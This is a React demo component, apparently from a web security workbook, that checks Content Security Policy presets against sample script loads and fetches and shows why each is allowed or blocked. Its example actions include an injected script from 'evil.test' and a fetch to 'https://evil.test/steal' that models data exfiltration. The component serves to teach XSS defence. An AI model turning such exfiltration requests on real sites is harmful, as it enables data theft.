import { useMemo, useState } from 'react';
import { Badge, Code, SegmentedControl, Stack, Table, Text, Textarea } from '@mantine/core';
import { Callout, DemoCard } from '@sfe/workbook';

const ORIGIN = 'https://app.example';

const PRESETS: Record<string, string> = {
  weak: `default-src 'self';
script-src 'self' 'unsafe-inline' 'unsafe-eval' https:;
object-src 'none'`,
  'host-allowlist': `default-src 'self';
script-src 'self' https://cdn.example.com;
connect-src 'self' https://api.example.com;
object-src 'none'; base-uri 'none'`,
  strict: `default-src 'self';
script-src 'nonce-abc123' 'strict-dynamic' https:;
connect-src 'self' https://api.example.com;
object-src 'none'; base-uri 'none'; frame-ancestors 'none'`,
};

interface Action {
  label: string;
  directive: 'script-src' | 'connect-src' | 'img-src';
  inline?: boolean;
  evalCall?: boolean;
  host?: string; // origin of external resource
  nonce?: string;
}

const ACTIONS: Action[] = [
  { label: 'Inline <script> (no nonce) — the injected-XSS case', directive: 'script-src', inline: true },
  { label: 'Inline <script nonce="abc123">', directive: 'script-src', inline: true, nonce: 'abc123' },
  { label: 'eval() / new Function()', directive: 'script-src', evalCall: true },
  { label: '<script src=https://cdn.example.com/lib.js>', directive: 'script-src', host: 'https://cdn.example.com' },
  { label: '<script src=https://evil.test/x.js> (injected)', directive: 'script-src', host: 'https://evil.test' },
  { label: "fetch('https://api.example.com/data')", directive: 'connect-src', host: 'https://api.example.com' },
  { label: "fetch('https://evil.test/steal')", directive: 'connect-src', host: 'https://evil.test' },
];

function parse(policy: string): Record<string, string[]> {
  const out: Record<string, string[]> = {};
  for (const part of policy.split(';')) {
    const tokens = part.trim().split(/\s+/).filter(Boolean);
    if (!tokens.length) continue;
    out[tokens[0]] = tokens.slice(1);
  }
  return out;
}

function hostMatches(list: string[], host: string): boolean {
  if (host === ORIGIN && list.includes("'self'")) return true;
  return list.some((src) => {
    if (src === 'https:' && host.startsWith('https://')) return true;
    if (src.startsWith('*.')) return host.endsWith(src.slice(1));
    return src === host;
  });
}

function evaluate(policy: Record<string, string[]>, a: Action): { allowed: boolean; reason: string } {
  const list = policy[a.directive] ?? policy['default-src'] ?? [];
  if (!list.length) return { allowed: false, reason: `no ${a.directive} or default-src → blocked` };
  if (list.includes("'none'")) return { allowed: false, reason: `${a.directive} is 'none'` };

  const hasNonceOrHash = list.some((s) => s.startsWith("'nonce-") || s.startsWith("'sha256-"));
  const strictDynamic = list.includes("'strict-dynamic'");

  if (a.evalCall) {
    return list.includes("'unsafe-eval'")
      ? { allowed: true, reason: "'unsafe-eval' present" }
      : { allowed: false, reason: "no 'unsafe-eval'" };
  }

  if (a.inline) {
    if (hasNonceOrHash) {
      const ok = !!a.nonce && list.includes(`'nonce-${a.nonce}'`);
      return ok
        ? { allowed: true, reason: 'nonce matches' }
        : { allowed: false, reason: "nonce present in policy ⇒ 'unsafe-inline' is ignored; this script has no matching nonce" };
    }
    return list.includes("'unsafe-inline'")
      ? { allowed: true, reason: "'unsafe-inline' (⚠ defeats XSS protection)" }
      : { allowed: false, reason: "no 'unsafe-inline' and no nonce" };
  }

  // external resource with a host
  if (a.host) {
    if (strictDynamic && a.directive === 'script-src') {
      // host allow-list is ignored under strict-dynamic; only nonce/propagated trust loads scripts
      return a.nonce && list.includes(`'nonce-${a.nonce}'`)
        ? { allowed: true, reason: 'nonce matches (strict-dynamic)' }
        : { allowed: false, reason: "'strict-dynamic' ignores host allow-list; an injected <script src> has no nonce → blocked" };
    }
    return hostMatches(list, a.host)
      ? { allowed: true, reason: 'host matches an allowed source' }
      : { allowed: false, reason: `host ${a.host} not in ${a.directive}` };
  }
  return { allowed: false, reason: 'unhandled' };
}

export function Demo() {
  const [preset, setPreset] = useState<keyof typeof PRESETS>('weak');
  const [policy, setPolicy] = useState(PRESETS.weak);
  const parsed = useMemo(() => parse(policy), [policy]);

  const blockedXss = !evaluate(parsed, ACTIONS[0]).allowed; // inline injected script blocked?

  return (
    <Stack gap="md">
      <Callout kind="info" title="Evaluate a policy against real requests">
        Pick a preset (or edit the policy text) and see how the browser would treat each script /
        fetch. The key row is the first one — an <b>injected inline script</b>. A policy only
        protects you against XSS if that row is <b>blocked</b>.
      </Callout>

      <SegmentedControl
        value={preset}
        onChange={(v) => {
          setPreset(v as keyof typeof PRESETS);
          setPolicy(PRESETS[v as keyof typeof PRESETS]);
        }}
        fullWidth
        data={[
          { label: "Weak ('unsafe-inline')", value: 'weak' },
          { label: 'Host allow-list', value: 'host-allowlist' },
          { label: 'Strict (nonce + strict-dynamic)', value: 'strict' },
        ]}
      />

      <DemoCard
        title="Policy"
        right={
          <Badge color={blockedXss ? 'teal' : 'red'} variant="filled">
            {blockedXss ? 'injected inline script BLOCKED' : 'XSS not mitigated'}
          </Badge>
        }
      >
        <Textarea autosize minRows={3} value={policy} onChange={(e) => setPolicy(e.currentTarget.value)} styles={{ input: { fontFamily: 'monospace', fontSize: 12.5 } }} />
        <Text size="xs" c="dimmed" mt={4}>
          Document origin treated as <Code>{ORIGIN}</Code> for <Code>'self'</Code> matching.
        </Text>
      </DemoCard>

      <DemoCard title="Request verdicts">
        <Table withTableBorder>
          <Table.Thead>
            <Table.Tr>
              <Table.Th>Request / action</Table.Th>
              <Table.Th w={90}>Verdict</Table.Th>
              <Table.Th>Why</Table.Th>
            </Table.Tr>
          </Table.Thead>
          <Table.Tbody>
            {ACTIONS.map((a) => {
              const v = evaluate(parsed, a);
              return (
                <Table.Tr key={a.label}>
                  <Table.Td>
                    <Text size="sm">{a.label}</Text>
                  </Table.Td>
                  <Table.Td>
                    <Badge color={v.allowed ? 'teal' : 'red'} variant={v.allowed ? 'light' : 'filled'}>
                      {v.allowed ? 'allowed' : 'blocked'}
                    </Badge>
                  </Table.Td>
                  <Table.Td>
                    <Text size="xs" c="dimmed">
                      {v.reason}
                    </Text>
                  </Table.Td>
                </Table.Tr>
              );
            })}
          </Table.Tbody>
        </Table>
      </DemoCard>
    </Stack>
  );
}
